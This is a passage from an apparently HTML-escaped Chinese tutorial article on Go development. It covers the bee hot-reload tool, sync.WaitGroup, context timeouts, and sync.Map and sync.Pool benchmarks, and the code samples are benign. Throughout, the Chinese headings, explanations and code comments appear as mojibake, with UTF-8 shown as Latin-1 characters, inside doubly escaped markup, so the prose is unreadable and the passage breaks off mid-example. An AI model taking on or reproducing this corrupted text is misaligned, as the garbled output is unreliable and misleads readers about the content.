è½½å·¥å…·bee&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Goroutineå¹¶å‘æ§åˆ¶ä¹‹sync.WaitGroupåŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;å­Goroutineè¶…æ—¶æ§åˆ¶ä¹‹context.ContextåŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;å¹¶å‘å®‰å…¨çš„mapä¹‹sync.MapåŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;å‡å°‘GCå‹åŠ›ä¹‹sync.PoolåŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;å‡å°‘ç¼“å­˜ç©¿é€åˆ©å™¨ä¹‹singleflightåŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Channelçš„ä½¿ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;å•å…ƒæµ‹è¯•&amp;amp;åŸºå‡†æµ‹è¯•&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;æ€§èƒ½åˆ†æ&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-line=&quot;678&quot;&gt;&lt;span&gt;1. çƒ­åŠ è½½å·¥å…·bee&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;680&quot;&gt;&lt;p data-line=&quot;680&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šä»¥çƒ­åŠ è½½æ–¹å¼è¿è¡ŒGoä»£ç ï¼Œä¼šç›‘è§†ä»£ç çš„å˜åŠ¨é‡æ–°è¿è¡Œä»£ç ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;682&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;683&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;å®‰è£…&lt;br/&gt;&lt;/span&gt;&lt;span&gt;go get github.com/beego/bee/v2&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;çƒ­åŠ è½½æ–¹å¼å¯åŠ¨é¡¹ç›®&lt;br/&gt;&lt;/span&gt;&lt;span&gt;SOAAGENT=10.40.24.126 bee run -main=main.go -runargs=&quot;start&quot;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;691&quot;&gt;&lt;span&gt;2. Goroutineå¹¶å‘æ§åˆ¶ä¹‹&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.WaitGroup&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;693&quot;&gt;&lt;p data-line=&quot;693&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šGoroutineå¯ä»¥ç­‰å¾…ï¼Œç›´åˆ°å½“å‰Goroutineæ´¾ç”Ÿçš„å­Goroutineæ‰§è¡Œå®Œæˆã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;695&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;696&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;wg := &amp;amp;sync.WaitGroup{}&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­a å¼€å§‹æ‰§è¡Œ&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­a æ‰§è¡Œå®Œæ¯•&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­b å¼€å§‹æ‰§è¡Œ&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­b æ‰§è¡Œå®Œæ¯•&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(wg *sync.WaitGroup)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­c å¼€å§‹æ‰§è¡Œ&quot;&lt;/span&gt;)&lt;br/&gt;time.Sleep(&lt;span&gt;5&lt;/span&gt; * time.Second)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å­c æ‰§è¡Œå®Œæ¯•&quot;&lt;/span&gt;)&lt;br/&gt;}(wg)&lt;br/&gt;&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;ä¸» ç­‰å¾…&quot;&lt;/span&gt;)&lt;br/&gt;wg.Wait()&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;ä¸» é€€å‡º&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬ä¸€æ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­a å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­c å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­b å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä¸» ç­‰å¾… &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt;&lt;span&gt; æ³¨æ„è¿™é‡Œå’Œä¸‹é¢æ‰“å°çš„ä½ç½®ä¸ä¸€æ ·ï¼Œå› ä¸ºå½“å‰ä»£ç å¹¶å‘æ‰§è¡Œæ˜¯æ²¡æœ‰ä¿éšœæ‰§è¡Œé¡ºåºçš„&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­b æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­a æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­c æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä¸» é€€å‡º&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬ä¸€æ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä¸» ç­‰å¾… &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt;&lt;span&gt; æ³¨æ„è¿™é‡Œå’Œä¸Šé¢æ‰“å°çš„ä½ç½®ä¸ä¸€æ ·ï¼Œå› ä¸ºå½“å‰ä»£ç å¹¶å‘æ‰§è¡Œæ˜¯æ²¡æœ‰ä¿éšœæ‰§è¡Œé¡ºåºçš„&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­a å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­c å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­b å¼€å§‹æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­b æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­c æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å­a æ‰§è¡Œå®Œæ¯•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä¸» é€€å‡º &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------&lt;/span&gt;&lt;span&gt; ä¸»Goroutineä¸€ç›´ç­‰å¾…ç›´åˆ°å­Goroutineéƒ½æ‰§è¡Œå®Œæ¯•&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;760&quot;&gt;&lt;span&gt;3. å­Goroutineè¶…æ—¶æ§åˆ¶ä¹‹&lt;/span&gt;&lt;code&gt;&lt;span&gt;context.Context&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;762&quot;&gt;&lt;p data-line=&quot;762&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šGoè¯­è¨€ç¬¬ä¸€å½¢å‚é€šå¸¸éƒ½ä¸ºcontext.Contextç±»å‹ï¼Œ1. ä¼ é€’ä¸Šä¸‹æ–‡ 2. æ§åˆ¶å­Goroutineè¶…æ—¶é€€å‡º 3. æ§åˆ¶å­Goroutineå®šæ—¶é€€å‡º&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;764&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;765&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;ctx, cancel := context.WithTimeout(context.TODO(), &lt;span&gt;5&lt;/span&gt;*time.Second)&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; cancel()&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(ctx context.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;execResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿä¸šåŠ¡é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- &lt;span&gt;bool&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿå¤„ç†è¶…æ—¶&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;6&lt;/span&gt; * time.Second)&lt;br/&gt;execResult &amp;lt;- &lt;span&gt;true&lt;/span&gt;&lt;br/&gt;}(execResult)&lt;br/&gt;&lt;span&gt;// ç­‰å¾…ç»“æœ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;select&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; &amp;lt;-ctx.Done():&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;è¶…æ—¶é€€å‡º&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; &amp;lt;-execResult:&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;å¤„ç†å®Œæˆ&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}(ctx)&lt;br/&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;10&lt;/span&gt; * time.Second)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// è¶…æ—¶é€€å‡º&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;803&quot;&gt;&lt;span&gt;4. å¹¶å‘å®‰å…¨çš„mapä¹‹&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;805&quot;&gt;&lt;p data-line=&quot;805&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šå¹¶å‘å®‰å…¨çš„mapï¼Œæ”¯æŒå¹¶å‘å†™ã€‚è¯»å¤šå†™å°‘åœºæ™¯çš„æ€§èƒ½å¥½ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;807&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;808&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;b&quot;&lt;/span&gt;, &lt;span&gt;&quot;b&quot;&lt;/span&gt;)&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;aa&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo-4    6334993       203.8 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// æ²¡æœ‰panic&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;833&quot;&gt;&lt;span&gt;5. å‡å°‘GCå‹åŠ›ä¹‹&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Pool&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;835&quot;&gt;&lt;p data-line=&quot;835&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šå¤ç”¨å¯¹è±¡ï¼Œå‡å°‘åƒåœ¾å›æ”¶GCå‹åŠ›ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;837&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;837&quot;&gt;&lt;span&gt;5.1Â  ä¸ä½¿ç”¨sync.Poolä»£ç ç¤ºä¾‹&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;840&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Country &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Province &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; City &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; County &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Street &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;ID   &lt;span&gt;int&lt;/span&gt;    &lt;span&gt;`json:&quot;id&quot;`&lt;/span&gt;&lt;br/&gt;Name &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;name&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ•°æ®&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// åœ°å€ä¿¡æ¯å¯¹è±¡&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; AddressModule &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Consignee       &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;consignee&quot;`&lt;/span&gt;&lt;br/&gt;Email           &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;email&quot;`&lt;/span&gt;&lt;br/&gt;Mobile          &lt;span&gt;int64&lt;/span&gt;     &lt;span&gt;`json:&quot;mobile&quot;`&lt;/span&gt;&lt;br/&gt;Country         *Country  &lt;span&gt;`json:&quot;country&quot;`&lt;/span&gt;&lt;br/&gt;Province        *Province &lt;span&gt;`json:&quot;province&quot;`&lt;/span&gt;&lt;br/&gt;City            *City     &lt;span&gt;`json:&quot;city&quot;`&lt;/span&gt;&lt;br/&gt;County          *County   &lt;span&gt;`json:&quot;county&quot;`&lt;/span&gt;&lt;br/&gt;Street          *Street   &lt;span&gt;`json:&quot;street&quot;`&lt;/span&gt;&lt;br/&gt;DetailedAddress &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;detailed_address&quot;`&lt;/span&gt;&lt;br/&gt;PostalCode      &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;postal_code&quot;`&lt;/span&gt;&lt;br/&gt;AddressID       &lt;span&gt;int64&lt;/span&gt;     &lt;span&gt;`json:&quot;address_id&quot;`&lt;/span&gt;&lt;br/&gt;IsDefault       &lt;span&gt;bool&lt;/span&gt;      &lt;span&gt;`json:&quot;is_default&quot;`&lt;/span&gt;&lt;br/&gt;Label           &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;label&quot;`&lt;/span&gt;&lt;br/&gt;Longitude       &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;longitude&quot;`&lt;/span&gt;&lt;br/&gt;Latitude        &lt;span&gt;string&lt;/span&gt;    &lt;span&gt;`json:&quot;latitude&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ä¸ä½¿ç”¨sync.Pool&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo_NoPool&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;&lt;span&gt;// ç›´æ¥åˆå§‹åŒ–&lt;/span&gt;&lt;br/&gt;addressModule := &amp;amp;AddressModule{}&lt;br/&gt;addressModule.Consignee = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Email = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Mobile = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country = &amp;amp;Country{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.Province = &amp;amp;Province{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.City = &amp;amp;City{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.County = &amp;amp;County{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.Street = &amp;amp;Street{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;addressModule.DetailedAddress = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.PostalCode = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.IsDefault = &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;addressModule.Label = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Longitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Latitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä¸‹é¢è¿™æ®µä»£ç æ²¡æ„ä¹‰ åªæ˜¯ä¸ºäº†ä¸æŠ¥è¯­æ³•é”™è¯¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; addressModule == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ä¸ä½¿ç”¨sync.Poolæ‰§è¡Œç»“æœ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// cpu: Intel(R) Core(TM) i5-7360U CPU @ 2.30GHz&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo_NoPool-4   144146564        84.62 ns/op     120 B/op       5 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo21.782s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;ä¸ä½¿ç”¨sync.Poolæ‰§è¡Œåˆ†æï¼šç«ç„°å›¾&amp;amp;Topå‡½æ•°&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;span&gt;å¯ä»¥å¾ˆæ˜æ˜¾çœ‹è§GCè¿‡ç¨‹æ¶ˆè€—äº†å¤§é‡çš„CPU:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.30925925925925923&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeMBU933JdGRib5kSSYiaG7YxxoCGtkrv2iaSd6genWSCm3t8TsIuqqnJLQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.5703703703703704&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMekDCMRT5SQaC0TlLFRToE57r0xeglrErmO46TXOSQdb5OyR9Fec9nnA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;950&quot;&gt;&lt;span&gt;5.2 ä½¿ç”¨sync.Poolä»£ç ç¤ºä¾‹&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;951&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// ä½¿ç”¨sync.Pool&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo_Pool&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// ä½¿ç”¨ç¼“å­˜æ± sync.Pool&lt;/span&gt;&lt;br/&gt;demoPool := &amp;amp;sync.Pool{&lt;br/&gt;&lt;span&gt;// å®šä¹‰åˆå§‹åŒ–ç»“æ„ä½“çš„åŒ¿åå‡½æ•°&lt;/span&gt;&lt;br/&gt;New: 